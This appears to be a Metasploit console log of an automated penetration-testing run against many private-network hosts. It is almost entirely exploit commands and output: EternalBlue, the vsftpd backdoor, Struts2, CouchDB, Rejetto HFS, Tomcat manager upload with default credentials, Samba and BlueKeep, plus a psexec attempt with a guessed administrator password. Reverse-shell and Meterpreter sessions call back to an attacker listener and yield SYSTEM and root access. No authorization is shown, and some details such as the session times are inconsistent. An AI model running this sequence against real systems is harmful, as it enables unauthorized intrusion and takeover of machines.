# Metasploit Framework Console Log
# Session: 2024-01-15 14:30:00 - 2024-01-15 16:45:30

       =[ metasploit v6.3.4-dev                           ]
+ -- --=[ 2294 exploits - 1201 auxiliary - 410 post       ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

[*] Processing commands from automated_scan.rc...
[*] Starting penetration testing session...

msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.1.45
RHOST => 192.168.1.45
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.0.0.5
LHOST => 10.0.0.5
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] 192.168.1.45:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.45:445 - Host is likely VULNERABLE to MS17-010!
[*] 192.168.1.45:445 - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.1.45:445 - The target is vulnerable.
[*] 192.168.1.45:445 - Connecting to target for exploitation.
[*] Started reverse TCP handler on 10.0.0.5:4444
[*] 192.168.1.45:445 - Sending stage (200774 bytes) to 192.168.1.45
[*] Meterpreter session 1 opened (10.0.0.5:4444 -> 192.168.1.45:49158) at 2024-01-15 14:32:45

msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information              Connection
  --  ----  ----                     -----------              ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM      10.0.0.5:4444 -> 192.168.1.45:49158

msf6 exploit(windows/smb/ms17_010_eternalblue) > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 10.0.0.12
RHOST => 10.0.0.12
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 10.0.0.12:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.0.0.12:21 - USER: 331 Please specify the password.
[+] 10.0.0.12:21 - Backdoor service has been spawned, handling...
[+] 10.0.0.12:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 2 opened (10.0.0.5:46823 -> 10.0.0.12:6200) at 2024-01-15 14:35:12

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > use exploit/multi/http/struts2_content_type_ognl
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/struts2_content_type_ognl) > set RHOST 172.16.5.88
RHOST => 172.16.5.88
msf6 exploit(multi/http/struts2_content_type_ognl) > set TARGETURI /struts2-showcase/integration/saveGangster.action
TARGETURI => /struts2-showcase/integration/saveGangster.action
msf6 exploit(multi/http/struts2_content_type_ognl) > set LHOST 10.0.0.5
LHOST => 10.0.0.5
msf6 exploit(multi/http/struts2_content_type_ognl) > exploit

[*] Started reverse TCP handler on 10.0.0.5:4444
[*] 172.16.5.88:8080 - Sending HTTP request with malicious Content-Type header...
[-] 172.16.5.88:8080 - Exploit failed: Rex::ConnectionTimeout The connection timed out (172.16.5.88:8080).
[*] Exploit completed, but no session was created.

msf6 exploit(multi/http/struts2_content_type_ognl) > set RHOST 172.16.5.90
RHOST => 172.16.5.90
msf6 exploit(multi/http/struts2_content_type_ognl) > exploit

[*] Started reverse TCP handler on 10.0.0.5:4444
[*] 172.16.5.90:8080 - Sending HTTP request with malicious Content-Type header...
[*] Sending stage (3045380 bytes) to 172.16.5.90
[*] Meterpreter session 3 opened (10.0.0.5:4444 -> 172.16.5.90:52341) at 2024-01-15 14:38:22

msf6 exploit(multi/http/struts2_content_type_ognl) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > sysinfo
Computer     : 172.16.5.90
OS           : Linux 172.16.5.90 4.15.0-142-generic #146-Ubuntu SMP Tue Apr 13 01:11:19 UTC 2021 x86_64
Architecture : x64
Meterpreter  : x64/linux
meterpreter > background
[*] Backgrounding session 3...

msf6 exploit(multi/http/struts2_content_type_ognl) > use exploit/linux/http/apache_couchdb_cmd_exec
[*] Using configured payload linux/x64/shell_reverse_tcp
msf6 exploit(linux/http/apache_couchdb_cmd_exec) > set RHOST 10.0.0.25
RHOST => 10.0.0.25
msf6 exploit(linux/http/apache_couchdb_cmd_exec) > set LHOST 10.0.0.5
LHOST => 10.0.0.5
msf6 exploit(linux/http/apache_couchdb_cmd_exec) > exploit

[*] Started reverse TCP handler on 10.0.0.5:4444
[*] 10.0.0.25:5984 - Checking if 10.0.0.25:5984 is vulnerable...
[-] 10.0.0.25:5984 - Target does not appear to be vulnerable.
[*] Exploit completed, but no session was created.

msf6 exploit(linux/http/apache_couchdb_cmd_exec) > set RHOST 10.0.0.28
RHOST => 10.0.0.28
msf6 exploit(linux/http/apache_couchdb_cmd_exec) > show options

Module options (exploit/linux/http/apache_couchdb_cmd_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    10.0.0.28        yes       The target address
   RPORT    5984             yes       The target port
   SRVHOST  0.0.0.0          yes       The local host
   SRVPORT  8080             yes       The local port
   TARGETURI  /              yes       Base path

msf6 exploit(linux/http/apache_couchdb_cmd_exec) > exploit

[*] Started reverse TCP handler on 10.0.0.5:4444
[*] 10.0.0.28:5984 - Checking if 10.0.0.28:5984 is vulnerable...
[+] 10.0.0.28:5984 - Target is vulnerable!
[*] 10.0.0.28:5984 - Executing payload...
[*] Sending stage (38 bytes) to 10.0.0.28
[*] Command shell session 5 opened (10.0.0.5:4444 -> 10.0.0.28:45892) at 2024-01-15 14:45:07

msf6 exploit(linux/http/apache_couchdb_cmd_exec) > use exploit/windows/http/rejetto_hdf_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hdf_exec) > set RHOST 192.168.1.67
RHOST => 192.168.1.67
msf6 exploit(windows/http/rejetto_hdf_exec) > set LHOST 10.0.0.5
LHOST => 10.0.0.5
msf6 exploit(windows/http/rejetto_hdf_exec) > set SRVPORT 8081
SRVPORT => 8081
msf6 exploit(windows/http/rejetto_hdf_exec) > exploit

[*] Started reverse TCP handler on 10.0.0.5:4444
[*] Using URL: http://10.0.0.5:8081/BYEaKl
[*] Server started.
[*] Sending malicious request to 192.168.1.67:80...
[!] Target may not be vulnerable. Continuing anyway...
[-] Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (192.168.1.67:80).
[*] Server stopped.

msf6 exploit(windows/http/rejetto_hdf_exec) > set RHOST 192.168.1.70
RHOST => 192.168.1.70
msf6 exploit(windows/http/rejetto_hdf_exec) > exploit

[*] Started reverse TCP handler on 10.0.0.5:4444
[*] Using URL: http://10.0.0.5:8081/XmNoPq
[*] Server started.
[*] Sending malicious request to 192.168.1.70:80...
[*] Sending stage (175686 bytes) to 192.168.1.70
[*] Meterpreter session 7 opened (10.0.0.5:4444 -> 192.168.1.70:51203) at 2024-01-15 14:52:33
[*] Server stopped.

msf6 exploit(windows/http/rejetto_hdf_exec) > sessions

Active sessions
===============

  Id  Name  Type                     Information                         Connection
  --  ----  ----                     -----------                         ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN-SRV01    10.0.0.5:4444 -> 192.168.1.45:49158
  2         shell cmd/unix           root                                10.0.0.5:46823 -> 10.0.0.12:6200
  3         meterpreter x64/linux    apache @ web-app-01                 10.0.0.5:4444 -> 172.16.5.90:52341
  5         shell x64/linux          couchdb                             10.0.0.5:4444 -> 10.0.0.28:45892
  7         meterpreter x86/windows  WORKSTATION\user @ WORKSTATION-PC   10.0.0.5:4444 -> 192.168.1.70:51203

msf6 exploit(windows/http/rejetto_hdf_exec) > use exploit/multi/http/tomcat_mgr_upload
[*] Using configured payload java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOST 172.16.10.45
RHOST => 172.16.10.45
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
HttpUsername => tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword tomcat
HttpPassword => tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.0.0.5
LHOST => 10.0.0.5
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit

[*] Started reverse TCP handler on 10.0.0.5:4444
[*] 172.16.10.45:8080 - Retrieving session ID and CSRF token...
[*] 172.16.10.45:8080 - Uploading and deploying payload...
[*] Sending stage (58829 bytes) to 172.16.10.45
[*] Meterpreter session 9 opened (10.0.0.5:4444 -> 172.16.10.45:38742) at 2024-01-15 15:03:18

msf6 exploit(multi/http/tomcat_mgr_upload) > sessions -i 9
[*] Starting interaction with 9...

meterpreter > getuid
Server username: tomcat7
meterpreter > background
[*] Backgrounding session 9...

msf6 exploit(multi/http/tomcat_mgr_upload) > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set RHOST 192.168.1.55
RHOST => 192.168.1.55
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
SMBUser => Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass Password123!
SMBPass => Password123!
msf6 exploit(windows/smb/psexec) > set LHOST 10.0.0.5
LHOST => 10.0.0.5
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.0.0.5:4444
[*] 192.168.1.55:445 - Connecting to the server...
[*] 192.168.1.55:445 - Authenticating to 192.168.1.55:445 as user 'Administrator'...
[-] 192.168.1.55:445 - Exploit failed [no-access]: RubySMB::Error::UnexpectedStatusCode STATUS_LOGON_FAILURE
[*] Exploit completed, but no session was created.

msf6 exploit(windows/smb/psexec) > use exploit/linux/samba/is_known_pipename
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(linux/samba/is_known_pipename) > set RHOST 10.0.0.33
RHOST => 10.0.0.33
msf6 exploit(linux/samba/is_known_pipename) > exploit

[*] 10.0.0.33:445 - Using location \\10.0.0.33\IPC$ for the path
[*] 10.0.0.33:445 - Retrieving the remote path of the share directory
[*] 10.0.0.33:445 - Share path: /tmp
[*] 10.0.0.33:445 - Uploaded payload to \\10.0.0.33\IPC$\QkJCQ.so
[*] 10.0.0.33:445 - Loading the payload...
[+] 10.0.0.33:445 - Probe response indicates the target is vulnerable
[*] Found shell.
[*] Command shell session 11 opened (10.0.0.5:39182 -> 10.0.0.33:445) at 2024-01-15 15:12:44

msf6 exploit(linux/samba/is_known_pipename) > sessions -i 11
[*] Starting interaction with 11...

id
uid=0(root) gid=0(root)
^Z
Background session 11? [y/N]  y

msf6 exploit(linux/samba/is_known_pipename) > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set RHOST 192.168.1.88
RHOST => 192.168.1.88
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set LHOST 10.0.0.5
LHOST => 10.0.0.5
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 2
target => 2
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > exploit

[*] Started reverse TCP handler on 10.0.0.5:4444
[*] 192.168.1.88:3389 - Connecting to target for exploitation
[*] 192.168.1.88:3389 - Sending MS_T120 channel request
[+] 192.168.1.88:3389 - Target is vulnerable!
[*] 192.168.1.88:3389 - Sending stage (200774 bytes) to 192.168.1.88
[*] Meterpreter session 13 opened (10.0.0.5:4444 -> 192.168.1.88:58921) at 2024-01-15 15:28:09

msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                         Connection
  --  ----  ----                     -----------                         ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN-SRV01    10.0.0.5:4444 -> 192.168.1.45:49158
  2         shell cmd/unix           root                                10.0.0.5:46823 -> 10.0.0.12:6200
  3         meterpreter x64/linux    apache @ web-app-01                 10.0.0.5:4444 -> 172.16.5.90:52341
  5         shell x64/linux          couchdb                             10.0.0.5:4444 -> 10.0.0.28:45892
  7         meterpreter x86/windows  WORKSTATION\user @ WORKSTATION-PC   10.0.0.5:4444 -> 192.168.1.70:51203
  9         meterpreter java/linux   tomcat7                             10.0.0.5:4444 -> 172.16.10.45:38742
  11        shell cmd/unix           root                                10.0.0.5:39182 -> 10.0.0.33:445
  13        meterpreter x64/windows  NT AUTHORITY\SYSTEM @ RDP-HOST     10.0.0.5:4444 -> 192.168.1.88:58921

[*] Automated testing session completed at 2024-01-15 15:30:45
[*] Total sessions established: 8
[*] Sessions closed during cleanup: 0